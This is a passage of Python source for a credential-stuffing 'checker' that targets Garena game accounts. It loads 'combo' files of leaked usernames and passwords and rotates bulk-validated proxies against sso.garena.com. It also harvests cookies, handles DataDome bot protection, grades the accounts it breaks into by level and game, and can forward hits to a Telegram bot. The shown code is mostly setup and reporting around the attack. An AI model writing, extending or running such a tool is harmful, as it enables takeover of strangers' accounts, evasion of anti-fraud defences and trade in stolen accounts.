        choice = _ask("Select mode (1-3): ")
        if choice in ("1", "2", "3"):
            break
        _err("Invalid choice. Enter 1, 2, or 3.")
    print()

    if choice == "1":
        fmt_text = (
            Text("Enter a proxy URL in any format.\n\n", style="bold bright_white") +
            Text("  Supported protocols:\n", style="dim") +
            Text("  HTTP    ", style="bold #ffd750") + Text("– standard proxy, most compatible\n", style="dim") +
            Text("  HTTPS   ", style="bold #ffd750") + Text("– encrypted tunnel to proxy server\n", style="dim") +
            Text("  SOCKS5  ", style="bold #ffd750") + Text("– lower level, faster, supports UDP\n", style="dim") +
            Text("  SOCKS4  ", style="bold #ffd750") + Text("– legacy, no auth, TCP only\n\n", style="dim") +
            Text("  Accepted formats:\n", style="dim") +
            Text("  http://user:pass@host:port      ", style="#ffd750") + Text("← standard URL\n", style="dim") +
            Text("  socks5://user:pass@host:port    ", style="#ffd750") + Text("← SOCKS5 with auth\n", style="dim") +
            Text("  host:port:user:pass             ", style="#ffd750") + Text("← colon-separated\n", style="dim") +
            Text("  user:pass@host:port             ", style="#ffd750") + Text("← auth prefix\n", style="dim") +
            Text("  host:port                       ", style="#ffd750") + Text("← no auth\n\n", style="dim") +
            Text("  No auth needed?  ", style="dim") + Text("Use host:port or http://host:port\n", style="#ffd750") +
            Text("  Residential?     ", style="dim") + Text("Prefer SOCKS5 for better compatibility.\n", style="#ffd750") +
            Text("  Datacenter?      ", style="dim") + Text("HTTP works fine for most cases.", style="#ffd750")
        )
        _panel(fmt_text)

        url_input = _ask("Proxy URL (Enter to skip): ")
        print()

        if not url_input:
            proxy_manager = ProxyManager(enabled=False)
            _warn("No URL entered. Proxies disabled.")
        else:
            normalised = _parse_proxy_line(url_input)
            if not normalised:
                _err("Could not parse that format. Proxies disabled.")
                proxy_manager = ProxyManager(enabled=False)
            else:
                val_text = (
                    Text("Test this proxy before using it?\n\n", style="bold bright_white") +
                    Text("  [Y]  ", style="bold green") + Text("Yes – verify connectivity and IP\n", style="dim") +
                    Text("  [N]  ", style="bold yellow") + Text("No  – use as-is", style="dim")
                )
                _panel(val_text)
                do_validate = _ask("Validate? (Y/n): ").lower()

                if do_validate in ("", "y", "yes"):
                    print()
                    _info("🔍 Testing proxy…")
                    ok, info, lat = _validate_proxy(normalised)
                    _close_check_session()
                    print()
                    if ok:
                        _ok(f"Proxy live.  IP: [cyan]{info}[/cyan]")
                        _display_proxy_quality(1, 1, lat, indent)
                        proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                    else:
                        _err(f"Validation failed: [yellow]{info}[/yellow]")
                        hint_map = {
                            "auth_failed(407)":   "407 – Credentials rejected. Check username and password.",
                            "auth_denied(403)":   "403 – Account suspended or IP not whitelisted.",
                            "auth_denied(401)":   "401 – Invalid credentials.",
                            "dns_fail":           "Cannot resolve hostname. Check the host in the URL.",
                            "connection_refused": "Connection refused. Wrong port or server is down.",
                            "connect_timeout":    "Timed out. Proxy may be overloaded or host is wrong.",
                        }
                        hint = next((v for k, v in hint_map.items() if info.startswith(k)),
                                    "Proxy unreachable or blocked the check endpoint.")
                        console.print(indent + f"  [dim]↳ {hint}[/dim]")
                        print()

                        force_text = (
                            Text("Proxy failed validation.\n\n", style="bold yellow") +
                            Text("  [Y]  ", style="bold yellow") + Text("Use it anyway\n", style="dim") +
                            Text("  [N]  ", style="bold red") + Text("Disable proxies", style="dim")
                        )
                        _panel(force_text, border="yellow")
                        force = _ask("Use anyway? (y/N): ", color="bold yellow").lower()

                        if force in ("y", "yes"):
                            proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                            _warn("Proxy set (unvalidated).")
                        else:
                            proxy_manager = ProxyManager(enabled=False)
                            _warn("Proxies disabled.")
                else:
                    proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                    _ok("Custom proxy set (validation skipped).")

    elif choice == "2":
        file_text = (
            Text("Enter path to a proxy file (one proxy per line).\n\n", style="bold bright_white") +
            Text("  Supported protocols:\n", style="dim") +
            Text("  HTTP    ", style="bold #ffd750") + Text("– standard proxy, most compatible\n", style="dim") +
            Text("  HTTPS   ", style="bold #ffd750") + Text("– encrypted tunnel to proxy server\n", style="dim") +
            Text("  SOCKS5  ", style="bold #ffd750") + Text("– lower level, faster, supports UDP\n", style="dim") +
            Text("  SOCKS4  ", style="bold #ffd750") + Text("– legacy, no auth, TCP only\n\n", style="dim") +
            Text("  Accepted formats:\n", style="dim") +
            Text("  http://user:pass@host:port      ", style="#ffd750") + Text("← standard URL\n", style="dim") +
            Text("  socks5://user:pass@host:port    ", style="#ffd750") + Text("← SOCKS5 with auth\n", style="dim") +
            Text("  host:port:user:pass             ", style="#ffd750") + Text("← colon-separated\n", style="dim") +
            Text("  user:pass@host:port             ", style="#ffd750") + Text("← auth prefix\n", style="dim") +
            Text("  host:port                       ", style="#ffd750") + Text("← no auth\n\n", style="dim") +
            Text("  File tips:\n", style="dim") +
            Text("  #                               ", style="#ffd750") + Text("← lines starting with # are skipped\n", style="dim") +
            Text("  Blank lines                     ", style="#ffd750") + Text("← ignored automatically\n", style="dim") +
            Text("  Mixed formats                   ", style="#ffd750") + Text("← each line parsed independently\n\n", style="dim") +
            Text("  No auth needed?  ", style="dim") + Text("Use host:port or http://host:port\n", style="#ffd750") +
            Text("  Residential?     ", style="dim") + Text("Prefer SOCKS5 for better compatibility.\n", style="#ffd750") +
            Text("  Datacenter?      ", style="dim") + Text("HTTP works fine for most cases.\n\n", style="#ffd750") +
            Text("  Default: ", style="dim") + Text("proxies.txt", style="bold #ffd750") + Text(" in the current folder.", style="dim")
        )
        _panel(file_text)

        file_input = _ask("File path (Enter for proxies.txt): ") or "proxies.txt"
        print()

        if not Path(file_input).is_file():
            _err(f"File not found: '{file_input}'. Proxies disabled.")
            proxy_manager = ProxyManager(enabled=False)
        else:
            raw_lines = Path(file_input).read_text(encoding="utf-8", errors="ignore").splitlines()
            parsed_urls, skipped = [], 0
            for line in raw_lines:
                url = _parse_proxy_line(line)
                if url:
                    parsed_urls.append(url)
                elif line.strip() and not line.strip().startswith("#"):
                    skipped += 1

            console.print(
                indent +
                f"  [bold #ffd750]Loaded:[/bold #ffd750]  "
                f"[green]{len(parsed_urls)} proxies[/green]  "
                f"[dim]│[/dim]  "
                f"[yellow]{skipped} lines skipped[/yellow]"
            )
            print()

            if not parsed_urls:
                _warn("No valid proxies found. Proxies disabled.")
                proxy_manager = ProxyManager(enabled=False)
            else:
                val_text = (
                    Text("Validate all proxies?\n\n", style="bold bright_white") +
                    Text("  [Y]  ", style="bold green") + Text("Yes – test each, keep only working ones\n", style="dim") +
                    Text("  [N]  ", style="bold yellow") + Text("No  – use all as-is", style="dim")
                )
                _panel(val_text)
                do_validate = _ask("Validate? (Y/n): ").lower()

                if do_validate in ("", "y", "yes"):
                    print()
                    speed_text = (
                        Text("Select validation speed.\n\n", style="bold bright_white") +
                        Text("  [1]  ", style="bold #ffd750") + Text("Turbo   ", style="bold white") + Text("1000 threads, 4s timeout  – fastest, high RAM\n", style="dim") +
                        Text("  [2]  ", style="bold #ffd750") + Text("Fast    ", style="bold white") + Text(" 500 threads, 5s timeout  – recommended\n", style="dim") +
                        Text("  [3]  ", style="bold #ffd750") + Text("Normal  ", style="bold white") + Text(" 200 threads, 7s timeout  – stable\n", style="dim") +
                        Text("  [4]  ", style="bold #ffd750") + Text("Slow    ", style="bold white") + Text("  50 threads, 10s timeout – low-end PC", style="dim")
                    )
                    _panel(speed_text)
                    speed_choice = _ask("Speed (1-4, Enter = Fast): ")
                    workers, timeout = {"1": (1000, 4.0), "2": (500, 5.0), "3": (200, 7.0), "4": (50, 10.0)}.get(speed_choice, (500, 5.0))
                    print()

                    console.print(
                        indent +
                        f"  [bold #ffd750]Validating:[/bold #ffd750]  "
                        f"[yellow]{len(parsed_urls):,} proxies[/yellow]  "
                        f"[dim]│[/dim]  [cyan]{workers} threads[/cyan]  "
                        f"[dim]│  {timeout}s timeout[/dim]"
                    )
                    print()

                    valid_urls = _validate_proxies_bulk(parsed_urls, timeout=timeout, max_workers=workers, indent=indent)
                    _close_check_session()
                    print()

                    if not valid_urls:
                        _err("No proxies passed validation. Proxies disabled.")
                        proxy_manager = ProxyManager(enabled=False)
                    else:
                        save_text = (
                            Text("Save working proxies back to file?\n\n", style="bold bright_white") +
                            Text("  [Y]  ", style="bold green") + Text("Yes – overwrite file with working proxies only\n", style="dim") +
                            Text("  [N]  ", style="bold yellow") + Text("No  – use working proxies this session only", style="dim")
                        )
                        _panel(save_text)
                        save_back = _ask("Save back? (Y/n): ").lower()

                        if save_back in ("", "y", "yes"):
                            try:
                                Path(file_input).write_text("\n".join(valid_urls) + "\n", encoding="utf-8")
                                _ok(f"Saved [cyan]{len(valid_urls)}[/cyan] proxies to '[cyan]{file_input}[/cyan]'.")
                            except Exception as e:
                                _warn(f"Could not write file: {e}")

                        proxy_manager = ProxyManager(enabled=True)
                        proxy_manager.proxies = valid_urls
                        _ok(f"Loaded [cyan]{len(valid_urls)}[/cyan] validated proxies.")
                else:
                    proxy_manager = ProxyManager(enabled=True)
                    proxy_manager.proxies = parsed_urls
                    _ok(f"Loaded [cyan]{len(parsed_urls)}[/cyan] proxies (validation skipped).")

    else:
        proxy_manager = ProxyManager(enabled=False)
        _warn("Proxies disabled. Running direct.")

    _close_check_session()
    print()
    try:
        if proxy_manager and proxy_manager.enabled and proxy_manager.proxies:
            console.print(indent + f"[dim]Probing first proxy against sso.garena.com…[/dim]")
            _first = proxy_manager.proxies[0]
            _ok, _reason, _lat = _probe_proxy_chain(_first, timeout=20.0)
            if _ok:
                console.print(indent + f"[bold green]  ✔ Proxy reachable[/bold green]  [dim]({_lat:.0f}ms)[/dim]")
            else:
                console.print(indent + f"[bold red]  ✖ Proxy cannot reach sso.garena.com:[/bold red] [yellow]{_reason}[/yellow]")
                console.print(indent + f"[dim]  ↳ Auth may be wrong, plan expired, or service blocks Garena.[/dim]")
                _force = input(indent + "  Continue anyway? (y/N): ").strip().lower()
                if _force not in ('y', 'yes'):
                    proxy_manager = ProxyManager(enabled=False)
                    console.print(indent + f"[bold yellow]  ⚠  Proxies disabled[/bold yellow]")
    except Exception as _pe:
        console.print(indent + f"[dim]  Probe skipped: {_pe}[/dim]")
    print()
    input(indent + "Press Enter to continue...")


_proxy_check_local = threading.local()


def _get_check_session() -> requests.Session:
    if not hasattr(_proxy_check_local, "session"):
        s = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1,
            pool_maxsize=1,
            max_retries=0,
            pool_block=False
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _proxy_check_local.session = s
    return _proxy_check_local.session

def _close_check_session() -> None:
    if hasattr(_proxy_check_local, "session"):
        try:
            _proxy_check_local.session.close()
        except Exception:
            pass
        del _proxy_check_local.session

def _parse_proxy_line(raw: str) -> Optional[str]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if re.match(r"^(https?|socks[45])://", raw, re.IGNORECASE):
        parsed = urllib.parse.urlparse(raw)
        if parsed.hostname and parsed.port:
            return raw
        return None
    if "@" in raw:
        return "http://" + raw
    parts = raw.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            host, port, user, pw = a, b, c, d
        elif d.isdigit():
            user, pw, host, port = a, b, c, d
        else:
            return None
        return f"http://{urllib.parse.quote(user, safe='-._~')}:{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
    return None

def _validate_proxy(url: str, timeout: float = 5.0) -> Tuple[bool, str, float]:
    try:
        parsed = urllib.parse.urlparse(url)
        proxy_host = parsed.hostname or ""
        proxy_port = parsed.port or 8080
        if not proxy_host:
            return False, "no_host", -1.0
        raw_user = urllib.parse.unquote(parsed.username or "")
        raw_pass = urllib.parse.unquote(parsed.password or "")
    except Exception:
        return False, "parse_err", -1.0

    proxy_auth = None
    if raw_user:
        credentials = f"{raw_user}:{raw_pass}".encode()
        proxy_auth = f"Basic {base64.b64encode(credentials).decode()}"

    last_err = "dead"
    sock = None

    for target_host, target_port, target_path in [
        ("ip-api.com", 80, "/json/?fields=query,status"),
        ("api.ipify.org", 80, "/?format=json")
    ]:
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            sock.settimeout(timeout)

            req_lines = [
                f"GET http://{target_host}{target_path} HTTP/1.1",
                f"Host: {target_host}",
                "Accept: application/json",
                "Connection: close"
            ]
            if proxy_auth:
                req_lines.append(f"Proxy-Authorization: {proxy_auth}")

            sock.sendall("\r\n".join(req_lines + ["", ""]).encode())

            data = b""
            while len(data) < 4096:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data and len(data) > 200:
                    break

            latency_ms = (time.monotonic() - t0) * 1000
            status_line = data.decode(errors="replace").split("\r\n", 1)[0] if data else ""
            parts = status_line.split(" ", 2)
            status_code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0

            if status_code == 200:
                body = data.decode(errors="replace").split("\r\n\r\n", 1)[-1].strip()
                if body and body[0] in "0123456789abcdefABCDEF":
                    body = body.split("\r\n", 1)[-1].split("\r\n")[0].strip()
                try:
                    jdata = json.loads(body)
                    ip = str(jdata.get("query") or jdata.get("ip") or "?").split(",")[0].strip()
                    return True, ip, latency_ms
                except Exception:
                    return True, "alive(no-ip)", latency_ms

            if status_code == 407:
                last_err = "auth_failed(407)"
            elif status_code in (401, 403):
                last_err = f"auth_denied({status_code})"
            elif status_code:
                last_err = f"http_{status_code}"

        except socket.timeout:
            last_err = "connect_timeout"
        except ConnectionRefusedError:
            last_err = "connection_refused"
            break
        except socket.gaierror:
            last_err = "dns_fail"
            break
        except Exception as e:
            last_err = type(e).__name__
        finally:
            if sock is not None:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    if last_err not in ("auth_failed(407)", "auth_denied(403)", "auth_denied(401)", "dns_fail", "connection_refused"):
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            latency_ms = (time.monotonic() - t0) * 1000
            return True, f"alive(no-ip,{last_err})", latency_ms
        except Exception:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    return False, last_err, -1.0

def _display_proxy_quality(valid_count, total_count, avg_latency_ms, indent="    "):
    if not total_count:
        return

    sr = (valid_count / total_count) * 100

    if sr >= 50 and 0 < avg_latency_ms <= 1500:
        tier, tc, bar_color = "HIGH",   "bold bright_green", "bright_green"
        icon, rec, note     = "🟢",     "up to 20",          "Proxies are fast and reliable. Push thread count high."
    elif sr >= 30 or (0 < avg_latency_ms <= 2500):
        tier, tc, bar_color = "MEDIUM", "bold yellow",        "yellow"
        icon, rec, note     = "🟡",     "8 – 12",             "Acceptable pool. Balance threads to avoid timeouts."
    else:
        tier, tc, bar_color = "LOW",    "bold red",            "red"
        icon, rec, note     = "🔴",     "3 – 5",              "Pool is weak. Low threads reduce wasted retries."

    lat   = f"{avg_latency_ms:.0f} ms" if avg_latency_ms > 0 else "N/A"
    BW    = 24

    def _bar(pct, width=BW, color="bright_green"):
        filled = int(pct / 100 * width)
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    def _lat_bar(ms, width=BW):
        if ms <= 0:
            return f"[dim]{'░' * width}[/dim]"
        capped = min(ms, 3000)
        filled = int(capped / 3000 * width)
        color  = "bright_green" if ms <= 800 else "yellow" if ms <= 1800 else "red"
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    lat_hint = (
        "[bright_green]Excellent[/bright_green]" if 0 < avg_latency_ms <= 800  else
        "[yellow]Acceptable[/yellow]"             if avg_latency_ms <= 1800     else
        "[red]Slow[/red]"                         if avg_latency_ms > 1800      else
        "[dim]N/A[/dim]"
    )

    table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    table.add_column(style="dim", width=22)
    table.add_column(style="white", width=36)

    table.add_row(
        "  Quality Tier",
        f"[{tc}]{icon}  {tier}[/{tc}]"
    )
    table.add_row("", "")
    table.add_row(
        "  Success Rate",
        f"[bold]{sr:.1f}%[/bold]  [dim]({valid_count:,} / {total_count:,})[/dim]"
    )
    table.add_row("", _bar(sr, color=bar_color))
    table.add_row("", "")
    table.add_row(
        "  Avg Latency",
        f"[bold]{lat}[/bold]  [dim]{lat_hint}[/dim]"
    )
    table.add_row("", _lat_bar(avg_latency_ms))
    table.add_row("", "")
    table.add_row(
        "  Rec. Threads",
        f"[bold #ffd750]{rec}[/bold #ffd750]"
    )
    table.add_row(
        "  Advice",
        f"[dim]{note}[/dim]"
    )

    console.print()
    console.print(Panel(
        table,
        title=f"[bold bright_white] PROXY QUALITY REPORT [/bold bright_white]",
        subtitle=f"[{tc}] {tier} TIER [/{tc}]",
        border_style=bar_color,
        padding=(1, 2),
        expand=False
    ))
    console.print()

def _validate_proxies_bulk(urls: List[str], timeout: float = 5.0, max_workers: int = 500, indent: str = "    ") -> List[str]:
    total = len(urls)
    workers = min(max_workers, max(total, 1))
    valid = []
    invalid = []
    latencies = []
    lock = threading.Lock()
    start_time = time.monotonic()

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[bold #ffd750]Validating"),
        BarColumn(bar_width=30),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        MofNCompleteColumn(),
        TextColumn("│ [green]{task.fields[valid]}✔[/green] [red]{task.fields[invalid]}✖[/red]"),
        TimeElapsedColumn(),
        TextColumn("ETA"),
        TimeRemainingColumn(),
        console=console,
        refresh_per_second=12
    )

    with progress:
        task = progress.add_task(
            "Validating",
            total=total,
            valid=0,
            invalid=0
        )

        def _check_one(url: str) -> None:
            ok, _, lat = _validate_proxy(url, timeout=timeout)
            with lock:
                if ok:
                    valid.append(url)
                    if lat > 0:
                        latencies.append(lat)
                else:
                    invalid.append(url)
                progress.update(
                    task,
                    completed=len(valid) + len(invalid),
                    valid=len(valid),
                    invalid=len(invalid)
                )

        def _wrapped_check(url: str) -> None:
            try:
                _check_one(url)
            finally:
                _close_check_session()

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(_wrapped_check, u) for u in urls]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass

    _close_check_session()

    avg_speed = total / max(time.monotonic() - start_time, 0.001)
    console.print(f"\n{indent}  [bold green]✔ Valid: {len(valid):,}[/bold green]   [bold red]✖ Dead: {len(invalid):,}[/bold red]   [dim]│  ~{avg_speed:.0f}/s[/dim]")

    avg_lat = (sum(latencies) / len(latencies)) if latencies else -1.0
    _display_proxy_quality(len(valid), total, avg_lat, indent)

    return valid

def _display_final_summary(live_stats: 'LiveStats', label: str = 'SESSION COMPLETE'):
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.padding import Padding
    from rich import box

    console = Console()
    stats = live_stats.get_stats()
    elapsed = max(time.time() - live_stats.start_time, 0.001)
    proc = live_stats.get_processed_count()
    rate = proc / elapsed
    total = live_stats.total_accounts

    overview_text = Text()
    overview_text.append("Total Processed: ", style="#ffd750")
    overview_text.append(f"{proc}/{total}   ", style="#ffaa00")
    overview_text.append("|   Elapsed Time: ", style="#ffd750")
    overview_text.append(f"{int(elapsed//60)}m {int(elapsed%60)}s   ", style="#ffaa00")
    overview_text.append("|   Average Speed: ", style="#ffd750")
    overview_text.append(f"{rate:.2f} acc/s", style="#ffaa00")

    overview_panel = Panel(overview_text, title=f"📊 [bold green]{label}[/bold green]", border_style="green", expand=False)

    status_table = Table(box=box.SIMPLE_HEAVY, border_style="#ffd750", header_style="bold white", expand=False, show_lines=False)
    status_table.add_column("Category", style="#ffaa00")
    status_table.add_column("Count", justify="right", style="white")
    status_table.add_column("Percentage", justify="right", style="green")
    status_table.add_column("Visual")

    def add_row(title, count, base_total, color):
        pct = (count / base_total * 100) if base_total > 0 else 0
        bar_len = int((count / max(base_total, 1)) * 20)
        bar = f"[{color}]{'█' * bar_len}[/{color}]"
        status_table.add_row(f"[{color}]{title}[/{color}]", str(count), f"{pct:.1f}%", bar)

    add_row("✔ Valid", stats['valid'], total, "green")
    add_row("✖ Invalid", stats['invalid'], total, "red")
    add_row("· Errors", stats['error'], total, "dim")
    status_table.add_row("", "", "", "")
    ct = max(stats['valid'], 1)
    add_row("✦ Clean", stats['clean'], ct, "green")
    add_row("⊘ Not Clean", stats['not_clean'], ct, "yellow")
    add_row("◈ Has CODM", stats['has_codm'], ct, "cyan")
    add_row("○ No CODM", stats['no_codm'], ct, "magenta")

    status_panel = Panel(status_table, title="🎯 [italic #ffd750]Session Results[/italic #ffd750]", border_style="#ffd750", expand=False)

    level_table = Table(box=box.SIMPLE_HEAVY, border_style="blue", header_style="bold white", expand=False, show_lines=False)
    level_table.add_column("Level Range", style="#ffd750")
    level_table.add_column("Clean", justify="right", style="green")
    level_table.add_column("Visual (Clean)", style="green")
    level_table.add_column("Not Clean", justify="right", style="yellow")
    level_table.add_column("Visual (NC)", style="yellow")

    clean_lvl = stats['clean_level_counts']
    nc_lvl = stats['not_clean_level_counts']
    c_tot = max(stats['clean'], 1)
    n_tot = max(stats['not_clean'], 1)

    for rng in ['351-400', '201-350', '101-200', '1-100']:
        cc = clean_lvl.get(rng, 0)
        nc = nc_lvl.get(rng, 0)
        c_bar = f"[green]{'█' * int((cc/c_tot)*15)}[/green]"
        n_bar = f"[yellow]{'█' * int((nc/n_tot)*15)}[/yellow]"
        level_table.add_row(f"Level {rng}", str(cc), c_bar, str(nc), n_bar)

    level_panel = Panel(level_table, title="🌍 [italic blue]Level Distribution[/italic blue]", border_style="blue", expand=False)

    console.print("\n")
    console.print(Padding(overview_panel, (0, 0, 0, 4)))
    console.print(Padding(status_panel, (0, 0, 0, 4)))
    console.print(Padding(level_panel, (0, 0, 0, 4)))

    hs = stats.get('highest_shell', 0)
    hs_c = "yellow" if hs > 0 else "dim"
    peak_text = Text.from_markup(f"[dim]▲ Top Clean Lv:[/dim] [green]{stats['highest_clean_level']}[/green]   [dim]▲ Top NC Lv:[/dim] [yellow]{getattr(live_stats, 'highest_not_clean_level', 0)}[/yellow]   [dim]◆ Peak Shell:[/dim] [{hs_c}]{hs:,}[/{hs_c}]")
    console.print(Padding(peak_text, (1, 0, 1, 6)))

    gc = stats.get('game_counts', {})
    active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
    if active_games:
        games_table = Table(box=box.SIMPLE_HEAVY, border_style="magenta", show_header=False)
        games_table.add_column("Game", style="dim")
        games_table.add_column("Count", style="cyan bold")
        for label, count in active_games:
            games_table.add_row(label, str(count))
        games_panel = Panel(games_table, title="🎮 [italic magenta]Games Found[/italic magenta]", border_style="magenta", expand=False)
        console.print(Padding(games_panel, (0, 0, 0, 4)))

    console.print(Padding(Text.from_markup("[#ffd750]◈  Powered by @dvlist[/#ffd750]"), (1, 0, 1, 6)))


def bulk_check(bulk_mode: str = 'full'):
    global _BULK_MODE
    _BULK_MODE = bulk_mode
    clear_screen()
    display_banner()
    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log('ERROR', "No combo files found in 'Combo' folder. Add .txt files and retry.")
        return
    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
    if not file_infos:
        _log('ERROR', 'No valid combo files found.')
        return
    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)
    if file_viewer.prompt_clean_file():
        with console.status('[#ffd750]  ↺  Cleaning file encoding…[/#ffd750]', spinner='dots'):
            valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
        _log('SUCCESS', f'Cleaned: [bold]{valid_count}[/bold] valid, [bright_red]{invalid_count}[/bright_red] removed')
    if file_viewer.prompt_remove_duplicates():
        with console.status('[#ffd750]  ↺  Removing duplicates…[/#ffd750]', spinner='dots'):
            removed = file_manager.clean_duplicates(selected_file)
        _log('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')
    auto_remove = file_viewer.prompt_auto_remove_checked()
    if auto_remove:
        _log('INFO', '[dim]Auto-remove enabled.[/dim]')

    global HARVEST_COOKIES
    HARVEST_COOKIES = input(f"  \033[38;2;255;170;0m>\033[0m harvest cookies? (y/N): ").strip().lower() == 'y'
    if HARVEST_COOKIES:
        _log('SUCCESS', 'Cookie harvesting enabled.', '    ')

    prompt_proxy_setup()
    if not proxy_manager or not proxy_manager.enabled:
        _log('INFO', '[dim]Running without proxies (direct connection)[/dim]')
    else:
        _log('SUCCESS', f'[dim]Proxy enabled — {len(proxy_manager.proxies)} proxies loaded[/dim]')
    clear_screen()
    display_banner()
    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append(f'{account}:{password}')
        file_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        file_table.add_column(style='dim', width=12, no_wrap=True)
        file_table.add_column(style='bright_white', no_wrap=True)
        file_table.add_row('File', f'[#ffd750]{Path(selected_file).name}[/#ffd750]')
        file_table.add_row('Accounts', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='#ffaa00', box=CARD, padding=(0, 2), expand=False, width=60))
    except Exception:
        _log('ERROR', 'Could not read file.')
        return
    if not accounts:
        _log('ERROR', 'No valid accounts found in file.')
        return
    info_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    info_table.add_column(style='dim', width=16, no_wrap=True)
    info_table.add_column(style='bright_white', no_wrap=True)
    info_table.add_row('Total Queued', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
    info_table.add_row('Status', '[bright_green]Ready[/bright_green]')
    console.print(Panel(info_table, title='[bold #ffaa00]ℹ ACCOUNT QUEUE[/bold #ffaa00]', border_style='#ffaa00', box=CARD, padding=(0, 2), expand=False, width=50))
    results_manager = ResultsManager(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    live_stats.total_accounts = len(accounts)
    using_proxy = proxy_manager and proxy_manager.enabled and len(proxy_manager.proxies) > 0
    global _PROXIES_ACTIVE
    _PROXIES_ACTIVE = bool(using_proxy)
    if using_proxy:
        _log('INFO', f'[dim]Using {len(proxy_manager.proxies)} proxies[/dim]')
    else:
        _log('INFO', '[dim]Direct connection (no proxies)[/dim]')
    print()
    max_threads = 250 if using_proxy else 80
    _P = '\033[38;2;255;170;0m'
    print()
    print(f"  {_P}│{_RST} {_P}THREAD CONFIG{_RST}")
    print(f"    {_DIM}30-80 direct  ·  80-150 balanced  ·  150+ proxy{_RST}")
    print()
    while True:
        try:
            raw = input(f"  {_P}▸{_RST} threads 1-{max_threads} {_DIM}(default {DEFAULT_THREADS}){_RST}: ").strip()
            num_threads = DEFAULT_THREADS if not raw else int(raw)
            if 1 <= num_threads <= max_threads:
                break
            _log("ERROR", f"Enter a value between 1 and {max_threads}.")
        except ValueError:
            _log("ERROR", "Invalid input — enter a number.")
    _log("SUCCESS", f"Running with {_BRT}{num_threads}{_RST} thread(s)")
    print()
    global CHECK_OTHER_GAMES
    print(f"  {_P}│{_RST} {_P}OTHER GAMES{_RST}")
    print(f"    {_DIM}AOV / ROV / FF / Delta Force… (+1-3s/acc){_RST}")
    CHECK_OTHER_GAMES = input(f"  {_P}▸{_RST} check other games? (y/N): ").strip().lower() == "y"
    _log("SUCCESS" if CHECK_OTHER_GAMES else "INFO", "Will scan all Garena game connections" if CHECK_OTHER_GAMES else f"{_DIM}CODM only — skipping other game checks{_RST}")
    print()
    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
    def _tg_save(token, chat_id, mode, clean_range, nc_range):
        try:
            import json as _j
            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as _f:
                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 'clean': clean_range, 'nc': nc_range}, _f)
        except Exception:
            pass
    def _tg_load():
        try:
            import json as _j
            if not os.path.exists(_TG_CFG_FILE):
                return None
            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as _f:
                d = _j.load(_f)
            return d if d.get('token') and d.get('chat_id') else None
        except Exception:
            return None
    _saved_tg = _tg_load()
    _P = '\033[38;2;255;170;0m'
    print()
    print(f"  {_P}│{_RST} {_P}TELEGRAM NOTIFICATIONS{_RST}")
    print(f"    {_WH}1{_RST} clean only  {_DIM}·{_RST}  {_WH}2{_RST} not-clean  {_DIM}·{_RST}  {_WH}3{_RST} both  {_DIM}·{_RST}  {_WH}4{_RST} skip")
    print()
    tg_choice = ''
    while tg_choice not in ('1', '2', '3', '4'):
        tg_choice = input(f'  {_P}▸{_RST} ').strip()
    TG_ENABLED = tg_choice != '4'
    TG_SEND_CLEAN = tg_choice in ('1', '3')
    TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
    TG_BOT_TOKEN = TG_CHAT_ID = ''
    TG_LVL_MIN_CLEAN = TG_LVL_MAX_CLEAN = TG_LVL_MIN_NOTCLEAN = TG_LVL_MAX_NOTCLEAN = 0
    TG_LVL_MAX_CLEAN = TG_LVL_MAX_NOTCLEAN = 9999
    if TG_ENABLED:
        print()
        if _saved_tg:
            _log('SUCCESS', f"Saved config found — Token: {_saved_tg['token'][:12]}…  Chat: {_saved_tg['chat_id']}")
            print()
